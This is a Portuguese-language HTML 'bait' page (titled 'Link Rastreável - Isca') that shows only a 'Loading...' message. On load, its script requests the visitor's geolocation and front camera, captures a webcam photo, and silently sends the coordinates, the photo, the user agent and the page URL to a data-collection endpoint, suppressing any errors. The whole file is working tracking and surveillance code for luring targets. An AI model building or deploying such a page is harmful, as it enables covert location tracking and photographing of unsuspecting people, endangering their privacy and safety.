<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Link Rastre√°vel - Isca</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Roboto', sans-serif;
    }
  </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
  <div class="text-center">
    <h1 class="text-2xl font-semibold mb-4">Carregando...</h1>
    <p class="text-gray-600">Coletando dados, por favor aguarde.</p>
  </div>

  <script>
    async function sendData(data) {
      try {
        await fetch('http://localhost:3000/api/collect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });
      } catch (error) {
        // Fail silently
      }
    }

    async function capturePhoto(video) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/png');
    }

    async function getMedia() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false // optional: set to true to capture audio
        });
        return stream;
      } catch (err) {
        return null;
      }
    }

    async function main() {
      if (!navigator.geolocation) {
        sendData({ error: 'Geolocation not supported' });
        return;
      }

      navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude } = position.coords;

        const stream = await getMedia();
        let photoDataUrl = null;

        if (stream) {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          await new Promise((resolve) => {
            video.onloadedmetadata = () => {
              resolve();
            };
          });

          photoDataUrl = await capturePhoto(video);

          // Stop all tracks to release camera
          stream.getTracks().forEach(track => track.stop());
        }

        const dataToSend = {
          latitude,
          longitude,
          photo: photoDataUrl,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          url: window.location.href
        };

        sendData(dataToSend);
      }, (error) => {
        sendData({ error: error.message });
      });
    }

    window.onload = main;
  </script>
</body>
</html>
